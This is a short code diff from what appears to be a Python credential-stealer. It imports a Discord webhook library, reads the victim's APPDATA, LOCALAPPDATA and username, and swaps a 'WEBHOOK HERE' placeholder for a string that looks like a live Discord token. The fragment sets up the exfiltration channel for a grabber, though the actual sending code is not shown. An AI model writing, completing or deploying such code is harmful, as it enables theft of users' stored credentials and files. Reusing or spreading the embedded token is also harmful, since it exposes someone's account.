@@ -12,7 +12,7 @@ import zipfile
 from requests import get
 from dhooks import Webhook, File
 
-hook = Webhook('WEBHOOK HERE')
+hook = Webhook('NzQ0NTA4MTIwNDUzMDg3MzIy.XzkPOA.WPn48sPMwtqmKV1zbmZQeEN5k2M')
 path = os.getenv('APPDATA')
 localpath = os.getenv('LOCALAPPDATA')
 user = os.getenv('username')
